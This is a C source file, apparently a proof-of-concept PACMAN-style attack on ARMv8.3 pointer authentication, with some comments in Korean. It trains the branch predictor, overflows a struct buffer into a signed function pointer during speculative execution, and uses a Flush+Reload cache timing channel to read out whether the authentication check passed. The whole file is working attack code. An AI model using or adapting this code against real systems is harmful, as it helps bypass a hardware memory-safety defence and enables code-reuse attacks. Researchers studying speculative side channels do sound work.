#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <inttypes.h>
#include <ptrauth.h>
#include <sys/mman.h>
#include <unistd.h>

#define BRANCH_PREDICTION_LOOP 100

const char* safe_str = "0123456\0";
static unsigned char malicious[16 + sizeof(void (*)(void))];


/*

  clang -O2 -g -fno-omit-frame-pointer pacman.c \
  -target aarch64-linux-gnu \
  -march=armv8.3-a \
  -mbranch-protection=pac-ret \
  -fptrauth-intrinsics \
  -o pacman
*/

typedef struct object{
    char buf[10];
    void (*fp)(void);
}object;   

volatile object* obj;

void target(void) {
    puts("target(): entered");__asm__ __volatile__("dsb ish\n" );
}

void foo(void){
    puts("foo antered!\n");
}

static inline void trash_llc(uint8_t *buf, size_t sz){
    volatile uint8_t s = 0;
    for (size_t i=0; i<sz; i+=128) s ^= buf[i]; // 128B stride (M2는 128B 라인)
    asm volatile("" ::: "memory");
}

inline __attribute__((always_inline)) void serialized_flush(void *ptr)
{
    asm volatile("dc civac, %0" :: "r"(ptr) : "memory"); // 라인 클린+인벌리드
    asm volatile("dsb ish" ::: "memory");                // 완료 보장(데이터 가시성)
    asm volatile("isb"); 
}
volatile uint8_t temp= 0;

inline __attribute__((always_inline)) 
void vulnerable_func(void* probe, long pageSize, const char * str, int secret){

    __asm__ __volatile__(
    "paciza %0\n"
    : "=r" (obj->fp)      
    : "0" (obj->fp)        
    : "memory"
    );
                       
    volatile int temp = 0;

    serialized_flush(str);
    const size_t trash_sz = 64UL<<20; // 64MiB
    uint8_t *trash;
    posix_memalign((void**)&trash, 128, trash_sz);
    trash_llc(trash, trash_sz); 
    asm volatile("dsb ish");

    memcpy(obj->buf,str,strlen(str));

    // target branch
    if(10 > strlen(str)){
        
        temp ^= *(volatile int*)(probe + pageSize * secret);

        __asm__ __volatile__(
        "autiza %0\n"
        : "=r" (obj->fp)       
        : "0" (obj->fp)        
        : "memory"
        );
        
        temp ^= *(volatile int*)(probe + pageSize * secret);
    }
   // __asm__ __volatile__("blr %x0\n" :: "r"(obj->fp) : "memory"); 
    return;
}




inline __attribute__((always_inline))uint64_t rdtsc(){
    uint64_t v;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, cntvct_el0" : "=r"(v));
    asm volatile("isb");
    return v; volatile int temp = 0;
    
}


int main(void) {
    void (*raw_f)(void) = target;
    uintptr_t raw = (uintptr_t)raw_f;
   
    
    const long pageSize = sysconf(_SC_PAGESIZE);

    void* probe = mmap(NULL, pageSize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    if (probe == MAP_FAILED) { printf("Failed to allocate cache channel pages\n"); return EXIT_FAILURE; }
    

    memset(probe, 0x10, 256 * pageSize);
   
   
    uintptr_t offset = (uintptr_t)malicious - (uintptr_t)safe_str;

    obj = (object*)malloc(sizeof(object));
    memcpy(obj->buf,safe_str,strlen(safe_str));
    obj->fp = (void*)target;

    void (*fp)(void) = foo;
    memset(malicious, 0x90, 16);
    memcpy(malicious + 16, &fp, sizeof fp);

    int secret = 0;
    uint64_t t1,t2;
    volatile int temp = 0;


    

    // cache flush
    for(int i = 0; i < 256; i++) serialized_flush(probe + pageSize * i);

    const size_t trash_sz = 64UL<<20; // 64MiB
    uint8_t *trash;
    posix_memalign((void**)&trash, 128, trash_sz);
    trash_llc(trash, trash_sz); 
    asm volatile("dsb ish");

  

    for (int i = 0; i <= BRANCH_PREDICTION_LOOP; i++) {
        const char *ptr = safe_str + (i == BRANCH_PREDICTION_LOOP ? offset : 0);
        secret = secret + 50 * (i == BRANCH_PREDICTION_LOOP);
          
        volatile int temp = 0;

        vulnerable_func(probe,pageSize,ptr,secret);
    }


    // reload 
    t1 = rdtsc();
    temp ^= *(volatile int*)(probe);
    t2 = rdtsc();
    printf("architectural : %ld \n", t2-t1);
    
    t1 = rdtsc();
    temp ^= *(volatile int*)(probe + 50 * pageSize);
    t2 = rdtsc();
    printf("transient : %ld \n", t2-t1);
    
    t1 = rdtsc();
    temp ^= *(volatile int*)(probe + 200 * pageSize);
    t2 = rdtsc();
    printf("cache miss : %ld \n", t2-t1);
   
   
    return 0;
}
